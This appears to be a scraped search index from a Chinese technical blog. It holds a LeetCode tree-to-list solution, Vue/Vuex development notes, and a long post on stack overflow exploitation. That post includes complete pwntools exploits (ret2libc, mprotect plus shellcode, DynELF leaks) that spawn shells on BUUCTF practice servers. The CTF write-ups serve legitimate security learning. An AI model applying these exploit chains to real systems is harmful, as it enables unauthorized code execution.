为空，则直接返回； 初始化： 空节点 pre ； 转化为双向链表： 调用 dfs (root) ； 构建循环链表： 中序遍历完成后，head 指向头节点， pre 指向尾节点，因此修改 head 和 pre 的双向节点引用即可； 返回值： 返回链表的头节点 head 即可； 123456789101112131415161718192021class Solution {public: Node* treeToDoublyList(Node* root) { if(root == nullptr) return nullptr; dfs(root); head-&gt;left = pre; pre-&gt;right = head; return head; }private: Node *pre, *head; void dfs(Node* cur) { if(cur == nullptr) return; dfs(cur-&gt;left); if(pre != nullptr) pre-&gt;right = cur; //用pre来查找 else head = cur; //找到头结点 cur-&gt;left = pre; pre = cur; dfs(cur-&gt;right); }}; 复杂度分析： 时间复杂度 O (N)： N 为二叉树的节点数，中序遍历需要访问所有节点。 空间复杂度 O (N) ： 最差情况下，即树退化为链表时，递归深度达到 N，系统使用 O (N) 栈空间。","link":"/2022/01/27/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"title":"vue开发问题总结","text":"vue 开发中遇到的一些问题及解决方法 # 一、前后端跨域接口实现 # 1、安装 axios 插件并设置全局 1npm install axios --save-dev 安装完成后对 axios 进行全局调用，在 main.js 中设置 12import axios from 'axios'Vue.prototype.$axios = axios # 2、设置跨域代理 在 config 文件夹的 index.js 文件中 (或者是在 vue.config.js 中），设置 proxy 模块代理，之后重启项目 12345678910111213141516171819devServer: { port: port, open: true, overlay: { warnings: false, errors: true }, // before: require('./mock/mock-server.js') proxy: { [process.env.VUE_APP_BASE_API]: { target: 'http://0.0.0.0:8000/', // 用于本地调试 // target: '', // 用于生产环境 changeOrigin: true, pathRewrite: { ['^' + process.env.VUE_APP_BASE_API]: '' } } }}, # 3、 发送请求 在 src 的 views 文件夹中创建 test.vue 文件，在文件中进行编写，这里只介绍 js 部分，在 method 方法中设置接口，如下: 1234567891011121314151617181920212223loopResult (data) { const self = this; let e; self.axios.get( '/index/start/' ).then(res =&gt; { // 根据状态码判断是否跨域成功 if (res.data.recode === 2000) { var jsonObj = JSON.parse(JSON.stringify(res.data)); // 解析json数据 jsonObj = jsonObj.data; console.log(self.tableData[i].text_id); } } else { alert('获取数据失败'); } } ).catch(err =&gt; { console.log(err); }); }, 这样便可以调用 data 中声明的变量对应数据，从而在页面显示出来。 123456789101112export default { data() { return { page: 1, offset: 10, totalNum: 1000, tableData: [] } },} 也可以将异步方法封装成 spider.js, 如 在 request.js 中，可以改 VUE_APP_BASE_API 为想要的值 # 二、 动态表格实现 在 vue 的 template 中引入 el-table，props 对应后端传来的 json 数组中元素的名称 # 三、vue - 将数据存入 vuex 中以及从 vuex 中取出数据 转载自：https://juejin.cn/post/7025522047988006925#heading-8 Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。简单来说就是：应用遇到多个组件共享状态时，使用 vuex。 # vuex 的五个核心概念： State：共享状态，vuex 的基本数据，用来存储变量，相当于组件 data 里的数据，只不过此时变成了全局变量。 Getter：基于 state 的派生状态，相当于组件中的 computed 中的属性。 Mutation：更改 vuex 中 store 共享状态的方法，通过提交 mutation 来去修改状态，进行同步操作数据，通常用于 action 获取异步数据，获取通过 commit 提交数据给 mutation，在 mutation 同步操作 state 中的数据。 action：支持异步操作，可用于异步获取请求中的数据，并将获取的数据同步 commit 提交给 mutation，实现 ajax 异步请求数据，mutation 将其数据同步到 state 中。 modules：模块化 vuex，为了方便后期对于项目的管理，可以让每一个模块拥有自己的 state、mutation、action、getters, 使得结构非常清晰，方便管理。 优势和劣势有哪些？ 优势主要就是可以全局共享数据，方法。方便统一管理 劣势的话，页面刷新后 state 的变量都会还原清空，不会像 cookies 一样持久性存储 页面刷新后 vuex 的 state 数据丢失怎么解决？ 先说一下为什么会丢失呢？ 因为 store 里的数据是保存在运行内存中的，当页面刷新时页面会重新加载 vue 实例，store 里面的数据就会被重新赋值 如何避免？ 其实主要还是看使用的场景是怎样的，如果想某些数据持久性保留也可以搭配使用 cookies 或者 localStorage。比如一些登录的信息等。 比如请求拿到了登录信息后可以先存在 localStorage，将 state 里的变量值和 sessionStorage 里面的绑定，mutations 中修改的时候同时修改 state 和 localStorage。最后页面直接使用 vuex 中的变量。 # 正式进入使用 vuex 的安装 打开终端，输入命令行 npm install vuex --save 进行下载 vuex # vuex 应用核心管理仓库 构建 store 这里新建 store 文件夹，创建一个 js 取名为 index.js， 在 index 里 ，通过将 state,mutations,actions,getters 引入到 store 中，并暴露出 store 对象。 下面为 index.js 的代码 12345678910111213141516171819202122/* vuex最核心的管理对象 store*/import Vue from 'vue';import Vuex from 'vuex'; // 分别引入这四个文件 这四个文件的内容和用法在下面分别讲到import state from './state';import mutations from './mutations';import actions from './actions';import getters from './getters'; //声明使用插件Vue.use(Vuex)//new 一个Vuex的对象,将state,mutation,action,getters配置到vuex的store中,方便管理数据export default new Vuex.Store({ state, mutations, actions, getters,}) 挂载 store 到 vue 实例上 main.js 中 12345678import store from './store'// ..........new Vue({ el: '#app', router, store, // *** render: h =&gt; h(App)}) # state 状态管理数据 我们通常将需要进行管理的共享数据，放入 state 中，使其形似为全局变量，对于需要的组件进行引入该 state 状态数据。 12345678910const state = { userId: '', token: '', name: '', avatar: '', introduction: '', roles: [], tenantId: 1, userInfo: null}; # mutations 同步提交数据 mutations 用于更改 state 中的状态逻辑的，且为同步更改 state 中的状态数据。 需要知道的是在 vuex 中只能通过 mutation 来去修改 state 对象， 可以通过获取 actions 获取到的数据去修改 state, 也可以在 mutations 模块中直接定义方法来去更改状态数据。 1234567891011121314151617181920const mutations = { SET_TOKEN: (state, token) =&gt; { state.token = token; }, SET_USERID: (state, userId) =&gt; { state.userId = userId; }, SET_NAME: (state, name) =&gt; { state.name = name; }, SET_ROLES: (state, roles) =&gt; { state.roles = roles; }, SET_TENANTID: (state, roles) =&gt; { state.tenantId = roles; }, SET_USER_INFO: (state, userInfo) =&gt; { state.userInfo = userInfo; }}; 通过 mutations 和下面的 actions 模块，大家也可以看出 commit 是用于调用 mutation 模块中的。 在组件中调用其 mutation 模块的代码为： 1this.$store.commit('SET_TOKEN', token_data) # actions 的异步操作 actions 与其 mutations 类似，但其可以进行异步操作， 且将异步操作获取的数据提交给 mutations，使得 mutations 更改 state 中的状态数据，这里常常用于获取 ajax 请求中的数据 (因为是异步)，并将其获取的数据 commit 提交给 mutations 使得 state 数据状态的更新。 和 mutations 的不同之处在于： Action 提交的是 mutation，而不是直接变更状态。 Action 可以包含任意异步操作。 举例 1234567891011121314151617181920212223242526272829303132333435363738/* 下面就是通过actions执行异步Ajax请求，得到数据后，通过commit的方法调用mutations 从而更新数据例如： commit('SET_TOKEN', data.uuid);*/const actions = { login({ commit }, userInfo) { // 用户登录 const params = userInfo; params.userName = userInfo.userName.trim() return new Promise((resolve, reject) =&gt; { getLogin(params) .then((response) =&gt; { const { status, message, data } = response || {}; if (status === 200) { // 存入 参数： 1.调用的值 2.所要存入的数据 commit('SET_USER_INFO', data); commit('SET_TOKEN', data.uuid); commit('SET_USERID', data.id); commit('SET_ROLES', data.roles); commit('SET_NAME', data.realName); commit('SET_TENANTID', data.tenantId || 1); setToken(data.uuid); db.save('userInfo', data); db.save('tenantId', data.tenantId || 1); localStorage.setItem('loginToken', data.uuid); resolve(data); } else { // ElementUI.Message.error(message); // axios拦截统一提示了 } }) .catch((error) =&gt; { // ElementUI.Message.error(error.message); // axios拦截统一提示了 reject(error); }); }); },} 这个 actions 在组件中的调用方法就是： 123456 this.$store.dispatch('user/login', postUser) .then(res =&gt; { // ............. })// 我这里的login方法写在了user.js这个module里 所以这里调用是 user/login// 下面会讲到module # Getters 对 state 进行加工 Getters 相当于 computed 计算属性，用于加工处理 state 状态数据，有其两个默认参数，第一个默认参数为 state，第二个默认参数为 getters。 123456789const getters={ plusCount(state){ return state.count + 1 }, //获取state中状态数据对象，和获取getters模块中plusCount数据 totalCount(state,getters){ return getters.plusCount + state.count }} 在组件中调用该方法的代码片段为： 1this.$store.getters.totalCount() # 在 Vue 组件中获得 Vuex 状态 从 store 实例中读取状态最简单的方法就是在计算属性中返回某个状态，由于 Vuex 的状态存储是响应式的，所以在这里每当 store.state.count 变化的时候，都会重新求取计算属性，进行响应式更新。 12345computed: { count: function(){ return this.$store.state.count } }, 那么对于以上的 store 我们就简单介绍完了，相信大家看完后对于 vuex 会有一定的理解。那么这个时候我们要想，是不是使用 this.$store.state 或 this.$store.getters.xxx 感到麻烦呢？下面我们介绍另一种引入 state 和 getters 的方式 # 辅助函数 mapState 和 mapGetters 对于上述的在组件中引用 state 和 getters 的方法是不是感到麻烦呢？使用 mapState 你将会感受到便利。 组件中这样使用 12345678910111213141516171819202122//首先我们需要先将辅助函数引入import { mapGetters,mapState } from 'vuex' export default { computed: { // 使用对象展开运算符将 getter 混入 computed 对象中 ...mapGetters( ['plusCount','totalCount'] ) // 使用对象展开运算符将 state 混入 computed 对象中 ...mapState( ['userInfo','count'] ) },methods:{ getData(){ // 这里就能直接使用了 直接使用state 和getters里的数据 // this.userInfo // this.plusCount }}} # Module 子模块化管理 store 文件夹下的 index.js 代码如下 1234567891011121314151617181920212223import Vue from 'vue'import Vuex from 'vuex'import getters from './getters'Vue.use(Vuex)const modulesFiles = require.context('./modules', true, /\\.js$/)const modules = modulesFiles.keys().reduce((modules, modulePath) =&gt; { const moduleName = modulePath.replace(/^\\.\\/(.*)\\.\\w+$/, '$1') const value = modulesFiles(modulePath) modules[moduleName] = value.default return modules}, {})const store = new Vuex.Store({ modules, getters})export default store 文件目录如图 举例 api.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192import { getKey, getLogin, logout, getInfo } from '@/api/user';import { setToken, removeToken } from '@/utils/auth';import db from '@/utils/localstorage';import router, { resetRouter } from '@/router';import ElementUI from 'element-ui';const state = { userId: '', token: '', name: '', avatar: '', introduction: '', roles: [], tenantId: 1, userInfo: null // roles: ['9999']};const mutations = { SET_TOKEN: (state, token) =&gt; { state.token = token; }, SET_USERID: (state, userId) =&gt; { state.userId = userId; }, SET_NAME: (state, name) =&gt; { state.name = name; }, SET_ROLES: (state, roles) =&gt; { state.roles = roles; }, SET_TENANTID: (state, roles) =&gt; { state.tenantId = roles; }, SET_USER_INFO: (state, userInfo) =&gt; { state.userInfo = userInfo; }};const actions = { // 获取密钥 getKey({ commit }) { return new Promise((resolve, reject) =&gt; { getKey() .then((response) =&gt; { resolve(response); }) .catch((error) =&gt; { reject(error); }); }); }, // 用户登录 login({ commit }, userInfo) { // const { username, password } = userInfo; const params = userInfo; params.userName = userInfo.userName.trim() return new Promise((resolve, reject) =&gt; { // console.log(username, password); // setToken(state.token) // localStorage.setItem('loginToken', state.token) getLogin(params) // getLogin({ userName: username.trim(), password: password }) .then((response) =&gt; { const { status, message, data } = response || {}; if (status === 200) { // 存入 参数： 1.调用的值 2.所要存入的数据 commit('SET_USER_INFO', data); commit('SET_TOKEN', data.uuid); commit('SET_USERID', data.id); commit('SET_ROLES', data.roles); commit('SET_NAME', data.realName); commit('SET_TENANTID', data.tenantId || 1); setToken(data.uuid); db.save('userInfo', data); db.save('tenantId', data.tenantId || 1); localStorage.setItem('loginToken', data.uuid); resolve(data); } else { // ElementUI.Message.error(message); // axios拦截统一提示了 } }) .catch((error) =&gt; { // ElementUI.Message.error(error.message); // axios拦截统一提示了 reject(error); }); }); }, // 获取用户信息 getInfo({ commit, state }) { return new Promise((resolve, reject) =&gt; { getInfo(state.token) .then((response) =&gt; { const { data } = response; data.roles = response.data.rights.map(String); if (!data) { reject('验证失败，请重新登录。'); } const loginMessage = { memberId: data.id, userName: data.name, userTel: data.mobile, realName: data.realName, incorCom: data.incorCom, virtualCor: data.virtualCor, deptId: data.deptId, deptpath: data.deptpath, deptName: data.deptName }; localStorage.setItem('loginMessage', JSON.stringify(loginMessage)); const { id, roles, realName } = data; // 角色必须是非空数组! if (!roles || roles.length &lt;= 0) { reject('getInfo: 角色必须是非空数组!'); } commit('SET_USERID', id); commit('SET_ROLES', roles); commit('SET_NAME', realName); localStorage.setItem('userRights', roles); // commit('SET_AVATAR', avatar) // commit('SET_INTRODUCTION', introduction) resolve(data); }) .catch((error) =&gt; { reject(error); }); }); }, // 用户登出 logout({ commit, state }) { return new Promise((resolve, reject) =&gt; { logout(state.token) .then(() =&gt; { commit('SET_TOKEN', ''); commit('SET_ROLES', []); db.remove('router'); removeToken(); resetRouter(); resolve(); }) .catch((error) =&gt; { reject(error); }); }); }, // 删除token resetToken({ commit }) { return new Promise((resolve) =&gt; { commit('SET_TOKEN', ''); commit('SET_ROLES', []); removeToken(); resolve(); }); }, // 动态修改权限 changeRoles({ commit, dispatch }, role) { return new Promise(async(resolve) =&gt; { const token = role + '-token'; commit('SET_TOKEN', token); setToken(token); const { roles } = await dispatch('getInfo'); console.log(roles, 'rolesrolesroles'); resetRouter(); // 根据角色生成可访问路由映射 const accessRoutes = await dispatch('permission/generateRoutes', roles, { root: true }); // 动态添加可访问路由 router.addRoutes(accessRoutes); // 重置已访问视图和缓存视图 dispatch('tagsView/delAllViews', null, { root: true }); resolve(); }); }};export default { namespaced: true, state, mutations, actions}; 这样后可以按功能分 module 使用 页面中调用就是 1234567891011// 使用mutationsthis.$store.commit('api/SET_T', keys);// 使用actionsthis.$store.dispatch('user/login', postUser).then(res =&gt; {}）// 如果没有分module // 那就是 this.$store.commit('SET_T', keys);// 直接调用方法 # 四、解决 vuex 中刷新数据，数据消失问题 # 解决方法 # 操作 在自定义的 waiter.js 中加入 sessionStorage 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import {searchSpiderTask} from &quot;@/api/spider&quot;;const state = { // authInfo: JSON.parse(sessionStorage.getItem(&quot;COMPANY_AUTH_INFO&quot;)) || {} tableData: JSON.parse(sessionStorage.getItem(&quot;tableData&quot;)) || [], count: 0, title:'首页', // tableData:[],}const getters = { // tableData: state =&gt; state.tableData,}const mutations = { // change:(state,text)=&gt;{ // state.title=text; // }, // add:(state)=&gt;{ // state.count++ // }, GET__tableData(state,data){ state.tableData=data //数据更改 sessionStorage.setItem(&quot;tableData&quot;, JSON.stringify(state.tableData)) //存sessionStorage },}const actions={ getList(context){ searchSpiderTask().then( res=&gt;{ console.log(res.data); context.commit('GET__tableData',res.data); //传后端数据 } ) } }export default { namespaced: true, state, getters, mutations, actions,} 在对应的 vue 中 123456789101112131415161718192021//触发方法&lt;el-button type=&quot;primary&quot; plain @click=&quot;loopResult&quot; style=&quot;margin-left: 10px&quot;&gt;检查&lt;/el-button&gt;//method部分loopResult(data){ this.$store.dispatch('waiter/getList') //传actions searchSpiderTask().then(response =&gt; { console.log(response.code) if(response.code===20000) { const h = this.$createElement this.$notify({ title: '搜索成功', message: h('i', {style: 'color: teal'}, '搜索成功'), duration: 1000 }) } }).catch(err =&gt; { console.log(err) }) }, # 五、一些其他问题的解决方法 报错：[vuex] unknown action type:***","link":"/2022/03/07/vue%E5%BC%80%E5%8F%91%20(1)/"},{"title":"栈溢出","text":"ret2libc，fmtstr # 一。基础知识补充 指令指针寄存器，是存放下次将要执行的指令在代码段的偏移量，RIP、EIP、IP (Instruction Pointer) 分别为 64 位、32 位、16 位指令指针寄存器 以 64 位程序为例: 在执行 call 指令的时候，会向栈中压入 call 指令完成后下一条指令的地址，之后跳转到被调用的函数开始执行 push rbp ; 将父函数栈底压入栈中 mov rbp, rsp ; 将父函数栈顶变为子函数栈底 sub rsp, 0x70 ; 向低地址处为子函数开辟栈帧 在函数调用结束的时候，程序会执行这两条指令 leave 指令相当于执行了如下两条指令 mov esp ebp pop ebp ret 指令则可以理解为将栈中的返回地址 pop 给 rip 的操作，从而回到父函数继续执行 # 二. ret2text 栈溢出函数：strcpy 程序本身存在 fflush 函数，我们可以直接用它的 sh 来当作 system 的参数 # 三. ret2libc # 泄露 libc 利用思路： 利用 write 函数来泄露程序的 libc 版本 知道 libc 版本后去计算程序里的 system 函数和字符串 “/bin/sh” 的地址 覆盖返回地址为 system（‘/bin/sh’），获取 shell # 例题：2018_rop 1: 12345payload='a'*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)r.sendline(payload)write_addr=u32(r.recv(4)) # 获取write函数地址libc=LibcSearcher('write',write_addr) 首先填充‘a’*（0x88+4）造成溢出，覆盖到返回地址，返回地址填上 write 函数的 plt 地址来调用 write 函数，之后跟上 main 函数地址（我们要将程序程序重新执行一遍，再次利用输入点来进构造 rop） p32（0）+p32 (write_addr)+p32 (4) 是在设置 write 函数的参数，对应函数原型看一下，32 位程序是 4 位，所以这边写的 4，对应的 64 位程序是 8 位。 2: 1234offset=write_addr-libc.dump('write') #计算偏移量 #偏移量=程序里的函数地址-libc里的函数地址system_addr=offset+libc.dump('system')bin_sh=offset+libc.dump('str_bin_sh') 3: 构造 rop 获取 shell 1payload='a'*(0x88+4)+p32(system_addr)+p32(0)+p32(bin_sh) 完整 exp: 1234567891011121314151617181920212223242526from pwn import *from LibcSearcher import *r=remote('node3.buuoj.cn',27043)elf=ELF('./2018_rop')write_plt=elf.plt['write']write_got=elf.got['write']main=elf.sym['main']payload='a'*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)r.sendline(payload)write_addr=u32(r.recv(4))libc=LibcSearcher('write',write_addr)offset=write_addr-libc.dump('write')system_addr=offset+libc.dump('system')bin_sh=offset+libc.dump('str_bin_sh')payload='a'*(0x88+4)+p32(system_addr)+p32(0)+p32(bin_sh)r.sendline(payload)r.interactive() 但是我在这么写的时候出现了 timeout: the monitored command dumped core , 尝试泄露 read 函数的真实地址，再调用 read 函数来找到偏移。(后来找到问题有：payload 的顺序错误也会导致 timeout 和找不到 libc,timeout 对应 payload: 填充 + got 表 + plt 表 + main，找不到 libc 对应 payload: 填充 + pop_rdi_ret+binsh_system, 对应 64 位栈溢出，32 位和 64 位不同) 64 位查找 pop_rdi: 1ROPgadget --binary bjdctf_2020_babyrop |grep &quot;pop rdi&quot; exp: 1234567891011121314151617181920212223from pwn import *from LibcSearcher import *elf = ELF(&quot;./2018_rop&quot;)p = remote(&quot;node3.buuoj.cn&quot;,28628)read_plt = elf.plt['read']read_got = elf.got['read']write_plt = elf.plt['write']main_addr = 0x080484C6payload = 'a' * (0x88 + 0x4) payload += p32(write_plt) + p32(main_addr)payload += p32(1) + p32(read_got) + p32(8)p.sendline(payload)read_addr = u32(p.recv(4))print hex(read_addr)libc = LibcSearcher(&quot;read&quot;, read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)sys_addr = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = 'a' * (0x88 + 0x4)payload += p32(sys_addr) + p32(0) + p32(binsh)p.sendline(payload)p.interactive() LibcSearcher 使用方法：将 exp 放在 libcsearcher 的安装目录下 12345678910111213141516171819202122232425# coding:utf-8from pwn import*from LibcSearcher import*p=remote('node3.buuoj.cn','25295')elf=ELF('./1')main=0x400b28rdi=0x400c83ret=0x4006b9pus_plt=elf.plt['puts']puts_got=elf.got['puts']p.sendlineafter('Input your choice!\\n','1')payload='\\0'+'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendlineafter('Input your Plaintext to be encrypted\\n',payload)p.recvline()p.recvline() #接收 encrypt 的两个 puts函数输出;puts_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\0')) #得到 puts 函数 的地址;libc=LibcSearcher(&quot;puts&quot;,puts_addr) # 得到 libc的版本;libc_base=puts_addr-libc.dump(&quot;puts&quot;) # 得到偏移地址sys_addr=libc_base+libc.dump(&quot;system&quot;) # 利用偏移地址 得到 system函数的地址binsh=libc_base+libc.dump(&quot;str_bin_sh&quot;) # 得到 bin/sh 的 地址p.sendlineafter('choice!\\n','1') # 再一次执行 一遍流程payload='\\0'+'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys_addr)p.sendlineafter('encrypted\\n',payload)p.interactive() plt 表 -》got 表 # 四。利用 mprotect 修改内存权限 mprotect 函数，可以用它来修改我们，内存栈的权限，让它可读可写可执行，进而修改内存权限。 # ROPgadget 使用 例题：not_the_same_3dsctf_2016 利用 mprotect 函数修改 bss 段为 0x7 即 0b111 ，可读可写可执行权限，然后利用 read 函数读入 shellcode，最后跳转到 shellcode 的位置 1ROPgadget --binary not_the_same_3dsctf_2016--only &quot;pop|ret&quot;|grep pop 需要利用 ret 指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret=0x806fcc8 ctrl+s 调出程序的段表，将.got.plt 段改为可读可写可执行，addr=0x80eb000 将返回地址填写成 read 函数，设置 read 函数的参数，之后将返回地址改为我们修改为可读可写可执行的地址，最后读入 shellcode 12345678910111213141516171819202122232425# mprotect函数的利用，将目标地址：.got.plt或.bss段 修改为可读可写可执行int mprotect(const void *start, size_t len, int prot);argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (ida-ctrl+s 查看.got.plt/.bss起始地址) argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 0x1000 (0x1000通过程序启动时查看该内存块的大小的到的)argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 7 = 4 + 2 +1 (rwx)elf = ELF('./pwn')# ROPgadget --binary get_started_3dsctf_2016 --only 'pop|ret' | grep poppop3_addr = 0x0806fcc8 # pop esi ; pop ebx ; pop edx ; retpayload = 0x2D * 'a' + 0x4 * 'b' + p32(elf.symbols['mprotect'])payload += p32(pop3_addr) # 返回地址覆盖为pop3，目的为了栈还原，因为mprotect传入了三个参数，需要连续3个poppayload += p32(argu1) + p32(argu2) + p32(argu3)# 紧接着返回地址为 read对修改的目标地址写入shellcodepayload += p32(elf.symbols['read']) payload += p32(pop3_addr) # 同样栈还原，为了执行紧接着的 目标地址payload += p32(0) + p32(argu1) + p32(0x100)# read写完后 写入执行的目标地址payload += p32(argu1)# 先进行sendline执行到read等待输入sh.sendline(payload)# 继续sendline发送shellcodesh.sendline(asm(shellcraft.sh(), arch = 'i386', os = 'linux'))# 进入交互模式sh.interactive() 完整 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#coding:utf-8from pwn import*context.log_level = 'debug'context(arch='i386', os='linux')local = 0proc_name = './not_the_same_3dsctf_2016'elf = ELF(proc_name)# 这道题本地和远程两种解法，真的干。。。if local: sh = process(proc_name) str_flag_addr = 0x080ECA2D backdoor_addr = 0x080489A0 printf_addr = 0x0804F0A0 payload = 0x2D * 'a' # 这边不用覆盖ebp,在于get_flag并没有push ebp payload += p32(backdoor_addr) + p32(printf_addr) payload += p32(str_flag_addr) sh.sendline(payload)else: sh = remote('node3.buuoj.cn', 28308) mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] pop3_edi_esi_ebx_ret = 0x0806fcc8 mem_addr = 0x080EB000 #.got.plt 的起始地址 mem_size = 0x1000 mem_type = 0x7 # 可执行权限 payload = 0x2D * 'a' payload += p32(mprotect_addr) payload += p32(pop3_edi_esi_ebx_ret) payload += p32(mem_addr) + p32(mem_size) + p32(mem_type) payload += p32(read_addr) payload += p32(pop3_edi_esi_ebx_ret) payload += p32(0) + p32(mem_addr) + p32(0x100) payload += p32(mem_addr) #将read函数的返回地址设置到我们修改的内存的地址，之后我们要往里面写入shellcode sh.sendline(payload) # read写入shellcode payload = asm(shellcraft.sh()) sh.sendline(payload)sh.interactive() # 五. 32 位，64 位栈溢出对比 32 位的函数在调用栈的时候是： 调用函数地址(父函数的栈底地址）-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1....-&gt;参数1 由于在函数调用前通过 push 指令向栈中压入了数据，使得栈顶朝低地址偏移了所以在函数调用结束以后，要有恢复栈顶的过程：将通过 add esp 0x10 这条指令，即增加 esp 来恢复函数调用前的 esp。 64 位的函数在调用栈的时候是： 前六个参数按照约定存储在寄存器：rdi,rsi,rdx,rcx,r8,r9中。 参数超过六个的时候，第七个会压入栈中，并且先输入函数的返回地址，然后是函数的参数，之后才是函数的调用地址 # 六。覆盖相关变量 ebp ret_addr 虚函数指针 ​ 子类对父类的继承 ​ 能够对函数进行重写 ​ 由虚函数表来进行操作 SEH 链 ​ SEH 结构 结构 在栈中存在的 地方 ，在 在 ret_addr 和栈中数据之间 和栈中数据之间，这就导致了对于栈的安全防护 手段 ， 难以防护针对 防护针对 SEH 链的攻击 Hook 中的变量 利用方法介绍  有些系统函数有预先定义好的钩子  修改钩子链表中存储的子程序指针 影响钩子运行 fgets 的用法的时候，发现它能够避免造成溢出 程序自带的 system 函数地址 timeout: the monitored command dumped core 解决 1) 在 payload 后面加几个 ret 地址，或者加一个假的 0xdeadbeef 1p = flat(['a'*0x10, 'b'*8, pop_di, bin_sh_addr, system, 0xdeadbeef]) 2) 直接用系统函数的地址 # 七. BUUCTF 例题 # 1. JarvisOJ level4 # 知识点 参考文章：借助 DynELF 实现无 libc 的漏洞利用小结 pwntools 中 DynELF 函数使用 (针对未给出 libc 文件) 123456789def leak(address): payload=pad+p32(writeplt)+ret1+p32(1)+p32(address)+p32(4) io.sendline(payload) leak_sysaddr=io.recv(4) #print &quot;%#x =&gt; %s&quot; % (address, (leak_sysaddr or '').encode('hex')) 这里是测试用，可省略。 return leak_sysaddrd = DynELF(leak, elf=ELF(&quot;对应文件&quot;))sysaddr=d.lookup(&quot;system&quot;,&quot;libc&quot;) pad 为填充，ret1 为有效的返回地址 # WP 开了 NX 保护（堆栈不可执行） 利用 DynELF 泄露 system 地址，通过 read 函数写入 /bin/sh 到 bss 段 exp: 123456789101112131415161718192021222324from pwn import *conn=process('./level4')e=ELF('./level4')pad=0x88write_plt=e.plt['write']vul_addr=0x804844bbss_addr=0x0804a024def leak(address): payload1='a'*0x8c+p32(write_plt)+p32(vul_addr)+p32(1)+p32(address)+p32(4) conn.sendline(payload1) data=conn.recv(4) return data d=DynELF(leak,elf=e)system_addr=d.lookup('system','libc')print hex(system_addr)read_plt=e.plt['read']payload2='a'*0x8c+p32(read_plt)+p32(vul_addr)+p32(0)+p32(bss_addr)+p32(8)conn.sendline(payload2)conn.send(&quot;/bin/sh&quot;)payload3=&quot;a&quot;*0x8c+p32(system_addr)+p32(0xdeadbeef)+p32(bss_addr)conn.sendline(payload3)conn.interactive() 常规解法: 123456789101112131415161718192021222324252627282930#coding=utf-8from pwn import *from LibcSearcher import *context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)p = remote(&quot;node4.buuoj.cn&quot;, 25934)elf = ELF(&quot;./level4&quot;)read_got = elf.got[&quot;read&quot;]write_plt = elf.plt[&quot;write&quot;]main_addr = elf.symbols[&quot;main&quot;]payload = &quot;a&quot; * 0x8c + p32(write_plt)payload += p32(main_addr)payload += p32(1) + p32(read_got) + p32(4)p.sendline(payload)read_addr = u32(p.recvuntil(&quot;\\xf7&quot;)[-4:])libc = LibcSearcher(&quot;read&quot;, read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = &quot;a&quot; * 0x8c + p32(system_addr)payload += p32(main_addr)payload += p32(binsh_addr)p.sendline(payload)p.interactive() # jarvisoj_level3_x64 64 位 ret2libc（no canary found) checksec 泄露 libc 64 位汇编传参，当参数少于 7 个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。 当参数为 7 个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和 32 位汇编一样。 我们这边要利用 write 函数去泄露 libc 版本 write 函数的原型，它有三个参数，所以我们这边需要用到三个寄存器去传参 123456ssize_t write(int fd,const void*buf,size_t count);参数说明： fd:是文件描述符（write所对应的是写，即就是1） buf:通常是一个字符串，需要写入的字符串 count：是每次写入的字节数 利用 ROPgadget 寻找 rdi,rsi 寄存器地址 WP: 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from LibcSearcher import *r=remote('node4.buuoj.cn',26919)# r = process('./level3_x64')context(os = &quot;linux&quot;, arch = &quot;amd64&quot;, log_level= &quot;debug&quot;)elf=ELF('./level3_x64')#libc=ELF('./libc-2.19.so')write_plt=elf.plt['write']write_got=elf.got['write']main=0x40061Ardi=0x4006b3rsi_r15=0x4006b1payload='a'*(0x80+8)+p64(rdi)+p64(1) #rdi寄存器设置write函数的第一个参数为‘1’payload+=p64(rsi_r15)+p64(write_got)+p64(8) #rsi寄存器设置write函数的第二个参数为write_got表的地址，r15寄存器设置write函数的第三个参数为8payload+=p64(write_plt) #去调用write函数payload+=p64(main) #控制程序流，回到main函数，继续控制r.sendlineafter('Input:',payload)write_addr=u64(r.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))#write_addr=u64(r.recvuntil('\\n')[:-1].ljust(8,'\\0'))print hex(write_addr)libc=LibcSearcher('write',write_addr)libc_base=write_addr-libc.dump('write')system_addr=libc_base+libc.dump('system')binsh=libc_base+libc.dump('str_bin_sh')payload='a'*(0x80+8)+p64(rdi)+p64(binsh)+p64(system_addr)r.sendlineafter('Input:',payload)r.interactive() # bjdctf_2020_babyrop2 程序结构 init（） gift（） vuln（） 在 gift 函数处存在格式化字符串漏洞，可以用来泄露 libc 在 vuln 函数处存在 buf 溢出漏洞，绕过 canary 就可以利用 ret2libc 来获取 shell 泄露 canary 值 输入 %n$p 来找偏移，n 为偏移量， $p 定位到偏移处， %p 以 16 进制输出 找到一个 nop 